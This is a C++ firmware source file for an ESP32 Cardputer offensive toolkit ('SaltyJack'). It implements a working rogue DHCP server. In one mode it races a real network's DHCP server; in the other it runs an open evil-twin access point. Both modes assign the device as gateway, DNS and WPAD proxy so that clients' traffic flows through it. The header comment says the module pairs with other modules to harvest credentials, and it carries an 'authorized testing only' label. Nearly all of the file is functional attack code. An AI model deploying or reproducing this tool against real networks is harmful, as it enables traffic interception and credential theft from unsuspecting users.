/*
 * SaltyJack — Rogue DHCP (STA + AP modes).
 *
 * Direct port of @7h30th3r0n3's `rogueDHCP()` from Evil-Cardputer
 * (Evil-M5Project). https://github.com/7h30th3r0n3/Evil-M5Project
 *
 * Two modes:
 *   STA — POSEIDON joins a real network, then races the legitimate DHCP
 *         server by answering Discovers/Requests with our own Offers/ACKs.
 *         Whoever answers first "wins" the client; if we're closer to the
 *         client than the real DHCP server, we dominate.
 *   AP  — POSEIDON runs its own SoftAP with our SSID and is THE DHCP
 *         server. We stop the ESP-IDF internal dhcps, bind UDP 67, and
 *         hand out leases pointing at ourselves as gateway + DNS + WPAD.
 *
 * Both modes advertise:
 *   - Gateway = us
 *   - DNS = us
 *   - Option 252 (WPAD) = http://poseidon.lan/wpad.dat
 *   - Domain = poseidon.lan
 *
 * Pair with the SaltyJack Responder + WPAD modules to harvest creds.
 * AUTHORIZED TESTING ONLY.
 */
#include "../../app.h"
#include "../../ui.h"
#include "../../input.h"
#include "../../radio.h"
#include "saltyjack.h"
#include "saltyjack_style.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_netif.h>
#include <esp_random.h>
#include <string.h>

#define ROGUE_POOL_MIN      100
#define ROGUE_POOL_MAX      150
#define ROGUE_POOL_SIZE     (ROGUE_POOL_MAX - ROGUE_POOL_MIN + 1)
#define ROGUE_MAX_CLIENTS   16
#define ROGUE_UDP_LOCAL     67

struct rogue_client_t {
    uint8_t mac[6];
    uint8_t ip_suffix;   /* 0 = unallocated */
};

static WiFiUDP           s_udp;
static IPAddress         s_server_ip;
static IPAddress         s_subnet_mask;
static IPAddress         s_gateway;
static IPAddress         s_dns;
static bool              s_pool_taken[ROGUE_POOL_SIZE];
static rogue_client_t    s_clients[ROGUE_MAX_CLIENTS];
static uint32_t          s_offer_ct = 0;
static uint32_t          s_ack_ct   = 0;
static uint32_t          s_last_allocated_ip = 0;
static uint8_t           s_last_client_mac[6] = {0};

enum rogue_mode_t { ROGUE_STA = 0, ROGUE_AP = 1 };

/* ---- tiny helpers ---- */

static void rogue_reset(void)
{
    memset(s_pool_taken, 0, sizeof(s_pool_taken));
    memset(s_clients,    0, sizeof(s_clients));
    s_offer_ct = 0;
    s_ack_ct = 0;
    s_last_allocated_ip = 0;
    memset(s_last_client_mac, 0, 6);
}

static uint8_t get_msg_type(const uint8_t *pkt, int n)
{
    if (n < 240) return 0;
    int i = 240;
    while (i < n) {
        uint8_t opt = pkt[i++];
        if (opt == 0) continue;
        if (opt == 255) break;
        if (i >= n) break;
        uint8_t olen = pkt[i++];
        if (i + olen > n) break;
        if (opt == 53 && olen == 1) return pkt[i];
        i += olen;
    }
    return 0;
}

static void parse_options(const uint8_t *pkt, int n,
                          IPAddress &requested_ip, IPAddress &server_id)
{
    requested_ip = IPAddress(0, 0, 0, 0);
    server_id    = IPAddress(0, 0, 0, 0);
    if (n < 240) return;
    int i = 240;
    while (i < n) {
        uint8_t opt = pkt[i++];
        if (opt == 0) continue;
        if (opt == 255) break;
        if (i >= n) break;
        uint8_t olen = pkt[i++];
        if (i + olen > n) break;
        if (opt == 50 && olen == 4) requested_ip = IPAddress(pkt[i], pkt[i+1], pkt[i+2], pkt[i+3]);
        if (opt == 54 && olen == 4) server_id    = IPAddress(pkt[i], pkt[i+1], pkt[i+2], pkt[i+3]);
        i += olen;
    }
}

/* Allocate an IP suffix for a client MAC, or return existing allocation. */
static uint8_t allocate_ip(const uint8_t client_mac[6])
{
    /* Already have one? */
    for (int i = 0; i < ROGUE_MAX_CLIENTS; ++i) {
        if (memcmp(s_clients[i].mac, client_mac, 6) == 0 && s_clients[i].ip_suffix != 0) {
            return s_clients[i].ip_suffix;
        }
    }
    /* Find an empty pool slot. */
    for (int i = 0; i < ROGUE_POOL_SIZE; ++i) {
        if (s_pool_taken[i]) continue;
        s_pool_taken[i] = true;
        uint8_t suffix = ROGUE_POOL_MIN + i;
        /* Store in client table. */
        for (int j = 0; j < ROGUE_MAX_CLIENTS; ++j) {
            if (s_clients[j].ip_suffix == 0) {
                memcpy(s_clients[j].mac, client_mac, 6);
                s_clients[j].ip_suffix = suffix;
                return suffix;
            }
        }
        /* Client table full — still return the suffix. */
        return suffix;
    }
    return 0;
}

/*
 * Build a DHCP reply in place. `pkt` is the client's Discover/Request,
 * which we mutate into a BOOTREPLY (Offer or ACK).
 *
 * Returns the new packet length, or 0 on failure (no IP available).
 */
static int build_reply(uint8_t *pkt, int in_n, uint8_t msg_type, uint8_t *out_suffix)
{
    uint8_t client_mac[6];
    memcpy(client_mac, pkt + 28, 6);

    /* Clamp CHADDR to 16 bytes (6 MAC + 10 zeros). */
    memset(pkt + 34, 0, 10);

    IPAddress requested_ip, server_id;
    /* Use the real received length, not the stack buffer size — garbage past
     * `in_n` would yield bogus requested-IP/server-id reads. */
    parse_options(pkt, in_n, requested_ip, server_id);

    uint8_t suffix = 0;
    if (msg_type == 2) {  /* OFFER */
        suffix = allocate_ip(client_mac);
        if (suffix == 0) return 0;
    } else if (msg_type == 5) {  /* ACK */
        if (requested_ip != IPAddress(0, 0, 0, 0) &&
            requested_ip[0] == s_server_ip[0] &&
            requested_ip[1] == s_server_ip[1] &&
            requested_ip[2] == s_server_ip[2]) {
            suffix = requested_ip[3];
            /* Mark the suffix taken + remember the client. */
            int pool_idx = (int)suffix - ROGUE_POOL_MIN;
            if (pool_idx >= 0 && pool_idx < ROGUE_POOL_SIZE) {
                s_pool_taken[pool_idx] = true;
            }
            for (int j = 0; j < ROGUE_MAX_CLIENTS; ++j) {
                if (s_clients[j].ip_suffix == 0 ||
                    memcmp(s_clients[j].mac, client_mac, 6) == 0) {
                    memcpy(s_clients[j].mac, client_mac, 6);
                    s_clients[j].ip_suffix = suffix;
                    break;
                }
            }
        } else {
            suffix = allocate_ip(client_mac);
            if (suffix == 0) return 0;
        }
    }

    *out_suffix = suffix;

    /* Header fixups */
    pkt[0] = 2;   /* BOOTREPLY */
    /* FLAGS: broadcast bit — client hasn't got an IP yet. */
    pkt[10] = 0x80;
    pkt[11] = 0x00;

    /* yiaddr — offered IP */
    pkt[16] = s_server_ip[0];
    pkt[17] = s_server_ip[1];
    pkt[18] = s_server_ip[2];
    pkt[19] = suffix;

    /* siaddr — server IP */
    pkt[20] = s_server_ip[0];
    pkt[21] = s_server_ip[1];
    pkt[22] = s_server_ip[2];
    pkt[23] = s_server_ip[3];

    /* Magic cookie */
    pkt[236] = 0x63; pkt[237] = 0x82; pkt[238] = 0x53; pkt[239] = 0x63;

    int i = 240;

    /* Option 53 — DHCP message type */
    pkt[i++] = 53; pkt[i++] = 1; pkt[i++] = msg_type;

    /* Option 54 — Server Identifier */
    pkt[i++] = 54; pkt[i++] = 4;
    pkt[i++] = s_server_ip[0]; pkt[i++] = s_server_ip[1];
    pkt[i++] = s_server_ip[2]; pkt[i++] = s_server_ip[3];

    /* Option 1 — Subnet Mask */
    pkt[i++] = 1; pkt[i++] = 4;
    pkt[i++] = s_subnet_mask[0]; pkt[i++] = s_subnet_mask[1];
    pkt[i++] = s_subnet_mask[2]; pkt[i++] = s_subnet_mask[3];

    /* Option 3 — Router */
    pkt[i++] = 3; pkt[i++] = 4;
    pkt[i++] = s_gateway[0]; pkt[i++] = s_gateway[1];
    pkt[i++] = s_gateway[2]; pkt[i++] = s_gateway[3];

    /* Option 6 — DNS */
    pkt[i++] = 6; pkt[i++] = 4;
    pkt[i++] = s_dns[0]; pkt[i++] = s_dns[1];
    pkt[i++] = s_dns[2]; pkt[i++] = s_dns[3];

    /* Option 51 — Lease Time 86400 (24 h) */
    pkt[i++] = 51; pkt[i++] = 4;
    pkt[i++] = 0x00; pkt[i++] = 0x01; pkt[i++] = 0x51; pkt[i++] = 0x80;

    /* Option 15 — Domain Name */
    static const char domain[] = "poseidon.lan";
    pkt[i++] = 15; pkt[i++] = (uint8_t)(sizeof(domain) - 1);
    memcpy(pkt + i, domain, sizeof(domain) - 1); i += sizeof(domain) - 1;

    /* Option 252 — WPAD URL (pairs with SaltyJack WPAD harvester) */
    static const char wpad_url[] = "http://poseidon.lan/wpad.dat";
    pkt[i++] = 252; pkt[i++] = (uint8_t)(sizeof(wpad_url) - 1);
    memcpy(pkt + i, wpad_url, sizeof(wpad_url) - 1); i += sizeof(wpad_url) - 1;

    /* End option */
    pkt[i++] = 255;
    /* 4-byte padding */
    while (i % 4) pkt[i++] = 0;

    memcpy(s_last_client_mac, client_mac, 6);
    s_last_allocated_ip = ((uint32_t)s_server_ip[0] << 24) |
                          ((uint32_t)s_server_ip[1] << 16) |
                          ((uint32_t)s_server_ip[2] << 8)  |
                          (uint32_t)suffix;

    return i;
}

static void send_reply(const uint8_t *pkt, int n)
{
    s_udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
    s_udp.write(pkt, n);
    s_udp.endPacket();
}

/* ---- mode runners ---- */

static bool setup_sta_mode(void)
{
    if (WiFi.status() != WL_CONNECTED) return false;
    s_server_ip   = WiFi.localIP();
    s_subnet_mask = WiFi.subnetMask();
    s_gateway     = WiFi.localIP();   /* WE are the gateway */
    s_dns         = WiFi.localIP();
    return true;
}

static bool setup_ap_mode(void)
{
    WiFi.mode(WIFI_AP);
    /* Open SSID — evil-twin lures want targets to auto-associate without
     * a prompt for a password, so no WPA2. */
    WiFi.softAP("POSEIDON-SaltyJack");
    delay(300);
    s_server_ip   = WiFi.softAPIP();
    s_subnet_mask = IPAddress(255, 255, 255, 0);
    s_gateway     = WiFi.softAPIP();
    s_dns         = WiFi.softAPIP();

    /* Stop the ESP-IDF built-in DHCP server so UDP port 67 is free. The stop
     * is async — give lwIP a beat to close the internal PCB before we bind. */
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) esp_netif_dhcps_stop(ap_netif);
    delay(100);
    return true;
}

static void teardown_ap_mode(void)
{
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) esp_netif_dhcps_start(ap_netif);
}

static void run_rogue(rogue_mode_t mode)
{
    radio_switch(RADIO_WIFI);
    rogue_reset();

    bool ok = (mode == ROGUE_STA) ? setup_sta_mode() : setup_ap_mode();
    if (!ok) {
        auto &d = M5Cardputer.Display;
        sj_frame(mode == ROGUE_STA ? "ROGUE DHCP STA" : "ROGUE DHCP AP");
        d.setTextColor(SJ_BAD, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 24);
        d.print(mode == ROGUE_STA ? "STA not connected" : "AP setup failed");
        d.setTextColor(SJ_FG, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 38);
        d.print(mode == ROGUE_STA ? "join target WiFi first" : "check heap / radio");
        sj_footer("`=back");
        while (input_poll() == PK_NONE) delay(30);
        return;
    }

    if (!s_udp.begin(ROGUE_UDP_LOCAL)) {
        if (mode == ROGUE_AP) teardown_ap_mode();
        ui_toast("UDP :67 bind failed", 0xFB4A, 1500);
        return;
    }

    sj_frame(mode == ROGUE_STA ? "ROGUE DHCP STA" : "ROGUE DHCP AP");

    auto &d = M5Cardputer.Display;
    uint32_t last_draw = 0;
    while (true) {
        /* Handle any pending DHCP packet. */
        int ps = s_udp.parsePacket();
        if (ps > 0 && ps <= 512) {
            uint8_t buf[512];
            int rd = s_udp.read(buf, sizeof(buf));
            uint8_t t = get_msg_type(buf, rd);
            if (t == 1) {
                /* Discover → Offer */
                uint8_t suffix = 0;
                int n = build_reply(buf, rd, 2, &suffix);
                if (n > 0) {
                    send_reply(buf, n);
                    s_offer_ct++;
                }
            } else if (t == 3) {
                /* Request → ACK */
                uint8_t suffix = 0;
                int n = build_reply(buf, rd, 5, &suffix);
                if (n > 0) {
                    send_reply(buf, n);
                    s_ack_ct++;
                }
            }
        }

        if (millis() - last_draw > 250) {
            last_draw = millis();
            sj_frame(mode == ROGUE_STA ? "ROGUE DHCP STA" : "ROGUE DHCP AP");

            d.setTextColor(SJ_FG_DIM, SJ_BG);
            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y);
            d.print("srv ");
            d.setTextColor(SJ_ACCENT, SJ_BG);
            d.print(s_server_ip.toString().c_str());

            sj_row           (SJ_CONTENT_Y + 11, "offers  ", s_offer_ct);
            sj_row_highlight (SJ_CONTENT_Y + 20, "ACKs    ", s_ack_ct);

            int n_clients = 0;
            for (int i = 0; i < ROGUE_MAX_CLIENTS; ++i) {
                if (s_clients[i].ip_suffix != 0) n_clients++;
            }
            sj_row_colored(SJ_CONTENT_Y + 31, "clients ", (uint32_t)n_clients, SJ_WARN);

            if (s_last_allocated_ip != 0) {
                int by = SJ_CONTENT_Y + 48;
                sj_info_box(SJ_FRAME_X + 4, by, SJ_FRAME_W - 8, 28, "LAST LEASE");
                char ip_str[20], mac_str[24];
                snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                         (int)((s_last_allocated_ip >> 24) & 0xFF),
                         (int)((s_last_allocated_ip >> 16) & 0xFF),
                         (int)((s_last_allocated_ip >>  8) & 0xFF),
                         (int)( s_last_allocated_ip        & 0xFF));
                snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                         s_last_client_mac[0], s_last_client_mac[1],
                         s_last_client_mac[2], s_last_client_mac[3],
                         s_last_client_mac[4], s_last_client_mac[5]);
                sj_info_row(SJ_FRAME_X + 4, by, 0, "ip  ", ip_str);
                sj_info_row(SJ_FRAME_X + 4, by, 1, "mac ", mac_str);
            } else {
                sj_print_info(SJ_CONTENT_Y + 52, mode == ROGUE_STA ?
                    "racing real server..." : "awaiting clients...");
            }

            sj_footer("`=stop");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_NONE) delay(5);
    }

    s_udp.stop();
    if (mode == ROGUE_AP) teardown_ap_mode();
}

/* ---- feature entry points ---- */

void feat_saltyjack_dhcp_rogue_sta(void)
{
    run_rogue(ROGUE_STA);
}

void feat_saltyjack_dhcp_rogue_ap(void)
{
    run_rogue(ROGUE_AP);
}
